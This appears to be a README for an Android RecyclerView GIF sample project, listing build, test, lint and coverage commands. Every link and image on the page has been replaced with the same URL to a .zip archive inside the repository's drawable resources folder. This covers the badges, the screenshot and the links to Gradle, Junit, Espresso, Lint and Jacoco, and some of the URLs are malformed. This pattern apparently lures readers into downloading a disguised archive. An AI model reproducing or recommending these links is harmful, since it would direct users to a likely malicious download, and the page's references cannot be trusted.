# Android RecyclerView Gif Example

[![License](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
[![TravisCI OSX Build](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%20Build)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
[![CircleCI Linux Build](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%20Build)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
[![AppVeyor Windows Build](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%20Build)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
[![Coveralls Code Coverage](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%20Coverage)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
[![Twitter Follow](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)


Riffsy RecyclerView MVP Grid Example using Dagger 2, Retrofit 2, RxJava 2 and Butterknife with Junit and Espresso tests

<a href="https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip" target="_blank"><img src="https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip" width="250px" /></a>

## Module(s)
 
 - **android-gif-example** - Root module
   - **src**
     - **androidTest** - UI Tests
     - **main** - Source Code
     - **test** - Unit Tests

## Building and Running


This project builds with [Gradle](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) and the Android Build [tools](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip).


**Build the APK:**

    $ gradlew assembleDebug

**Install the APK:**

    $ gradlew installDebug

**Run the App:**

    $ gradlew runDebug

## Testing


**Running the Unit Tests:**


The [Junit](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) tests run on the JVM, no need for emulators or real devices.


    $ gradlew testDebug
    
**Running the Instrumentation Tests:**


The [Espresso](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) instrumentation tests run on the device.


    $ gradlew connectedDebugAndroidTest
    

## Reports


**Generate Lint Reports:**


The [Lint](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) plugin generates reports based off the source code.


    $ gradlew lintDebug


**Generate Jacoco Test Coverage:**


The [Jacoco](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) plugin generates coverage reports based off the unit tests.


    $ gradlew jacocoDebugReport
